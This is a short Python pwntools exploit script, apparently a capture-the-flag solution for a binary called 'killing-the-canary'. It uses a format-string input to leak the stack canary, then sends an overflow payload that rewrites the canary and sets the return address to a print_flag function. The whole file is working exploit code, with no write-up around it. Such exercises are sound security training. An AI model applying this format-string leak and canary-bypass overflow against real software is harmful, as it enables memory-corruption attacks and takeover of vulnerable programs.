#!/usr/bin/env python3
import re
from pwn import *

exe = ELF("./killing-the-canary")

r = process([exe.path])
# gdb.attach(r)

r.recvuntil(b"What's your name? ")
r.sendline(b"%15$llu") # leak the stack canary as decimal

val = r.recvuntil(b"What's your message? ")
log.info(val)
print(val.decode(errors="ignore")) 
match = re.match(b"Hello, ([0-9]+)\n!.*", val)
if not match:
    log.error(f"Failed to parse canary from: {val}")
    exit(1)
canary = int(match.group(1))
log.info(f"Canary: {canary:#x}")

win = exe.symbols['print_flag']
# log.info(hex(win))

payload = (
    b"A" * 64 +      # fill message buffer
    p64(canary) +    # overwrite canary with leaked value
    b"B" * 8 +       # saved rbp filler
    p64(win)         # return into print_flag
)
r.sendline(payload)

r.recvline()
r.interactive()
